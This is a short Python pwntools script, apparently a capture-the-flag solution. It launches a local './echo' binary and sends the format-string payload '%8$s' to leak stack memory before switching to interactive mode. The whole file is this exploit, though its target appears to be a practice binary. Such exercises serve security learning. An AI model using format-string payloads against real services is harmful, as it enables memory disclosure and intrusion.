from pwn import *

p = process("./echo")
elf = ELF("./echo")

p.sendlineafter("> " , "%8$s")
p.interactive()